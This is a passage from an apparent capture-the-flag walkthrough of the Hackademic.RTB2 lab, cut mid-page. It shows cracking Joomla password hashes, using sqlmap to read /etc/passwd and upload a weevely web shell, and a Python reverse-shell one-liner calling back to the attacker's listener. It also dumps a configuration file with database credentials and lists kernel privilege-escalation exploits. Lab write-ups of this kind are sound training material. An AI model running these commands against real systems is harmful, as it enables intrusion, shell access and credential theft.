</span><span class='line'>&lt;p>root@kali32:~/.sqlmap/output/192.168.80.150/dump# cat joomla/jos_users.csv | cut -d, -f 7,9 | sed -e &rsquo;s/:/\$/&lsquo; -e &rsquo;s/,/:/&rsquo;  > /tmp/joomla.pass&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~/.sqlmap/output/192.168.80.150/dump# john /tmp/joomla.pass  -format=dynamic_1
</span><span class='line'>&hellip;
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# john /tmp/joomla.pass  -format=dynamic_1 &ndash;show
</span><span class='line'>JSmith:matrix
</span><span class='line'>BTallor:victim
</span><span class='line'>test:test&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>3 password hashes cracked, 1 left</span></code></pre></td></tr></table></div></figure></p>

<p>Because the SQLi statements are executed by database root user, we can read or store arbitrary file to the server.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u &ldquo;&lt;a href="http://192.168.80.150:666/index.php?option=com_abc&amp;view=abc&amp;letter=test">http://192.168.80.150:666/index.php?option=com_abc&amp;view=abc&amp;letter=test&lt;/a>&rdquo;  -p letter &ndash;batch &ndash;file-read=/etc/passwd
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u &ldquo;&lt;a href="http://192.168.80.150:666/index.php?option=com_abc&amp;view=abc&amp;letter=test">http://192.168.80.150:666/index.php?option=com_abc&amp;view=abc&amp;letter=test&lt;/a>&rdquo;  -p letter &ndash;batch &ndash;file-read=/etc/issue</span></code></pre></td></tr></table></div></figure></p>

<p>The target is Ubuntu 10.04, we can predict better the filenames in /etc:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u &ldquo;&lt;a href="http://192.168.80.150:666/index.php?option=com_abc&amp;view=abc&amp;letter=test">http://192.168.80.150:666/index.php?option=com_abc&amp;view=abc&amp;letter=test&lt;/a>&rdquo;  -p letter &ndash;batch &ndash;file-read=/etc/phpmyadmin/config.inc.php&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>

<p>We generate and upload the weevely shell, then upgrade to python shell over netcat:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u &ldquo;&lt;a href="http://192.168.80.150:666/index.php?option=com_abc&amp;view=abc&amp;letter=test">http://192.168.80.150:666/index.php?option=com_abc&amp;view=abc&amp;letter=test&lt;/a>&rdquo;  -p letter &ndash;batch &ndash;file-write=weevely.php &ndash;file-dest=/var/www/test1.php&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:/usr/share/exploitdb# nc -lp 1338&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>www-data@HackademicRTB2:/tmp $ python -c &ldquo;import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(&lsquo;/bin/bash&rsquo;)&rdquo; 192.168.80.137 1338
</span><span class='line'>www-data@HackademicRTB2:/tmp$</span></code></pre></td></tr></table></div></figure></p>

<p>The following credentials could be used to log in phpMyAdmin using root:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">HackademicRTB2</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span> <span class="err">$</span> <span class="nx">cat</span> <span class="nx">configuration</span><span class="o">.</span><span class="nx">php</span>
</span><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'><span class="k">class</span> <span class="nc">JConfig</span> <span class="p">{</span>
</span><span class='line'><span class="o">/&lt;</span><span class="nx">em</span><span class="o">&gt;</span> <span class="nx">Site</span> <span class="nx">Settings</span> <span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;/</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$offline</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$offline_message</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="k">This</span> <span class="nx">site</span> <span class="nx">is</span> <span class="nx">down</span> <span class="k">for</span> <span class="nx">maintenance</span><span class="o">.&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span> <span class="nx">Please</span> <span class="nx">check</span> <span class="nx">back</span> <span class="nx">again</span> <span class="nx">soon</span><span class="o">.&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$sitename</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">Hackademic</span><span class="o">.</span><span class="nx">RTB2</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$editor</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">tinymce</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$list_limit</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">20</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$legacy</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="o">/&lt;</span><span class="nx">em</span><span class="o">&gt;</span> <span class="nx">Debug</span> <span class="nx">Settings</span> <span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;/</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$debug</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$debug_lang</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="o">/&lt;</span><span class="nx">em</span><span class="o">&gt;</span> <span class="nx">Database</span> <span class="nx">Settings</span> <span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;/</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$dbtype</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">mysql</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$host</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">localhost</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$user</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">root</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$password</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">yUtJklM97W</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$db</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">joomla</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$dbprefix</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">jos_</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="o">/&lt;</span><span class="nx">em</span><span class="o">&gt;</span> <span class="nx">Server</span> <span class="nx">Settings</span> <span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;/</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$live_site</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$secret</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">iFzlVUCg9BBPoUDU</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$gzip</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$error_reporting</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">-</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$helpurl</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&quot;http://help.joomla.org&quot;</span><span class="o">&gt;</span><span class="nx">http</span><span class="o">://</span><span class="nx">help</span><span class="o">.</span><span class="nx">joomla</span><span class="o">.</span><span class="nx">org</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$xmlrpc_server</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_host</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_port</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">21</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_user</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_pass</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_root</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_enable</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$force_ssl</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="o">/&lt;</span><span class="nx">em</span><span class="o">&gt;</span> <span class="nx">Locale</span> <span class="nx">Settings</span> <span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;/</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$offset</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$offset_user</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="o">/&lt;</span><span class="nx">em</span><span class="o">&gt;</span> <span class="nx">Mail</span> <span class="nx">Settings</span> <span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;/</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$mailer</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nb">mail</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$mailfrom</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#x69;&amp;#108;&amp;#116;&amp;#x6f;&amp;#58;&amp;#x61;&amp;#x64;&amp;#x6d;&amp;#x69;&amp;#x6e;&amp;#64;&amp;#104;&amp;#x61;&amp;#x63;&amp;#x6b;&amp;#x61;&amp;#x64;&amp;#x65;&amp;#109;&amp;#x69;&amp;#x72;&amp;#x74;&amp;#x62;&amp;#50;&amp;#x2e;&amp;#99;&amp;#111;&amp;#x6d;&quot;</span><span class="o">&gt;&amp;</span><span class="c1">#x61;&amp;#x64;&amp;#x6d;&amp;#105;&amp;#110;&amp;#x40;&amp;#x68;&amp;#97;&amp;#99;&amp;#107;&amp;#x61;&amp;#x64;&amp;#x65;&amp;#x6d;&amp;#105;&amp;#x72;&amp;#x74;&amp;#x62;&amp;#50;&amp;#46;&amp;#99;&amp;#x6f;&amp;#109;&lt;/a&gt;&amp;rsquo;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$fromname</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">Hackademic</span><span class="o">.</span><span class="nx">RTB2</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$sendmail</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">sbin</span><span class="o">/</span><span class="nx">sendmail</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$smtpauth</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$smtpsecure</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">none</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$smtpport</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">25</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$smtpuser</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$smtppass</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$smtphost</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">localhost</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="o">/&lt;</span><span class="nx">em</span><span class="o">&gt;</span> <span class="nx">Cache</span> <span class="nx">Settings</span> <span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;/</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$caching</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$cachetime</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">15</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$cache_handler</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nb">file</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="o">/&lt;</span><span class="nx">em</span><span class="o">&gt;</span> <span class="nx">Meta</span> <span class="nx">Settings</span> <span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;/</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$MetaDesc</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">Joomla</span><span class="o">!</span> <span class="o">-</span> <span class="nx">the</span> <span class="nx">dynamic</span> <span class="nx">portal</span> <span class="nx">engine</span> <span class="k">and</span> <span class="nx">content</span> <span class="nx">management</span> <span class="nb">system</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$MetaKeys</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">joomla</span><span class="p">,</span> <span class="nx">Joomla</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$MetaTitle</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$MetaAuthor</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="o">/&lt;</span><span class="nx">em</span><span class="o">&gt;</span> <span class="nx">SEO</span> <span class="nx">Settings</span> <span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;/</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$sef</span>           <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$sef_rewrite</span>   <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$sef_suffix</span>    <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="o">/&lt;</span><span class="nx">em</span><span class="o">&gt;</span> <span class="nx">Feed</span> <span class="nx">Settings</span> <span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;/</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$feed_limit</span>   <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$feed_email</span>   <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">author</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$log_path</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">logs</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$tmp_path</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span><span class="o">/</span><span class="nx">tmp</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="o">/&lt;</span><span class="nx">em</span><span class="o">&gt;</span> <span class="nx">Session</span> <span class="nx">Setting</span> <span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;/</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$lifetime</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">15</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$session_handler</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">database</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>We download the <a href="https://github.com/PenturaLabs/Linux_Exploit_Suggester">Linux_Exploit_Suggester.pl</a> and use for finding an exploit for privilege escalation:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@HackademicRTB2:/tmp$ perl Linux_Exploit_Suggester.pl
</span><span class='line'>perl Linux_Exploit_Suggester.pl&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Kernel local: 2.6.32&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Searching among 65 exploits&hellip;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Possible Exploits:
</span><span class='line'>[+] american-sign-language
</span><span class='line'>   CVE-2010-4347
</span><span class='line'>   Source: &lt;a href="http://www.securityfocus.com/bid/45408/">http://www.securityfocus.com/bid/45408/&lt;/a>
</span><span class='line'>[+] can_bcm
</span><span class='line'>   CVE-2010-2959
</span><span class='line'>   Source: &lt;a href="http://www.exploit-db.com/exploits/14814/">http://www.exploit-db.com/exploits/14814/&lt;/a>
</span><span class='line'>[+] half_nelson
</span><span class='line'>   Alt: econet    CVE-2010-3848
</span><span class='line'>   Source: &lt;a href="http://www.exploit-db.com/exploits/6851">http://www.exploit-db.com/exploits/6851&lt;/a>
</span><span class='line'>[+] half_nelson1
</span><span class='line'>   Alt: econet    CVE-2010-3848
</span><span class='line'>   Source: &lt;a href="http://www.exploit-db.com/exploits/17787/">http://www.exploit-db.com/exploits/17787/&lt;/a>
</span><span class='line'>[+] half_nelson2
</span><span class='line'>   Alt: econet    CVE-2010-3850
</span><span class='line'>   Source: &lt;a href="http://www.exploit-db.com/exploits/17787/">http://www.exploit-db.com/exploits/17787/&lt;/a>
</span><span class='line'>[+] half_nelson3
</span><span class='line'>   Alt: econet    CVE-2010-4073
</span><span class='line'>   Source: &lt;a href="http://www.exploit-db.com/exploits/17787/">http://www.exploit-db.com/exploits/17787/&lt;/a>
</span><span class='line'>[+] msr
</span><span class='line'>   CVE-2013-0268
</span><span class='line'>   Source: &lt;a href="http://www.exploit-db.com/exploits/27297/">http://www.exploit-db.com/exploits/27297/&lt;/a>
</span><span class='line'>[+] pktcdvd
</span><span class='line'>   CVE-2010-3437
</span><span class='line'>   Source: &lt;a href="http://www.exploit-db.com/exploits/15150/">http://www.exploit-db.com/exploits/15150/&lt;/a>
</span><span class='line'>[+] ptrace_kmod2
</span><span class='line'>   Alt: ia32syscall,robert_you_suck    CVE-2010-3301
</span><span class='line'>   Source: &lt;a href="http://www.exploit-db.com/exploits/15023/">http://www.exploit-db.com/exploits/15023/&lt;/a>
</span><span class='line'>[+] rawmodePTY
</span><span class='line'>   CVE-2014-0196
</span><span class='line'>   Source: &lt;a href="http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c">http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c&lt;/a>
</span><span class='line'>[+] rds
</span><span class='line'>   CVE-2010-3904
</span><span class='line'>   Source: &lt;a href="http://www.exploit-db.com/exploits/15285/">http://www.exploit-db.com/exploits/15285/&lt;/a>
</span><span class='line'>[+] reiserfs
</span><span class='line'>   CVE-2010-1146
</span><span class='line'>   Source: &lt;a href="http://www.exploit-db.com/exploits/12130/">http://www.exploit-db.com/exploits/12130/&lt;/a>
</span><span class='line'>[+] video4linux
</span><span class='line'>   CVE-2010-3081
</span><span class='line'>   Source: &lt;a href="http://www.exploit-db.com/exploits/15024/">http://www.exploit-db.com/exploits/15024/&lt;/a></span></code></pre></td></tr></table></div></figure></p>

<p>We root the server using:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
